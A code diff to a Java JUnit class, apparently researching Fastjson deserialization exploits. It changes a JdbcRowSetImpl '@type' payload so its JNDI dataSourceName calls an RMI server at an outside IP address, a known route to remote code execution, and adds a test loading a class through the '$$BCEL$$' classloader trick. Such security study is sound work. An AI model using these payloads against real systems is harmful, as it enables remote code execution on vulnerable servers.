@@ -5,11 +5,16 @@ import com.alibaba.fastjson.JSONObject;
 import com.alibaba.fastjson.parser.Feature;
 import com.alibaba.fastjson.parser.ParserConfig;
 import com.alibaba.fastjson.serializer.SerializerFeature;
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.junit.Test;
 
 import javax.xml.transform.TransformerConfigurationException;
+import java.io.IOException;
 import java.io.StringWriter;
 
 public class TestFastjson {
@@ -72,7 +77,18 @@ public class TestFastjson {
 
     @Test
     public void test9()   {
-        String test="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/d7myqb\",\"autoCommit\":true}" ;
+        String test="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://166.108.225.228:1099/tiabzl\",\"autoCommit\":true}" ;
+        System.out.println(test);
         Object o = JSON.parseObject(test, Object.class);
     }
+    @Test
+    public void test10() throws IOException, ClassNotFoundException {
+        JavaClass javaClass = Repository.lookupClass(TestFastjson.class);
+        String encode = Utility.encode(javaClass.getBytes(), true);
+        System.out.println(encode);
+
+        new ClassLoader().loadClass("$$BCEL$$" + encode);
+//        Object o = new ClassLoader().loadClass("$$BCEL$$" + encode).newInstance();
+    }
+
 }
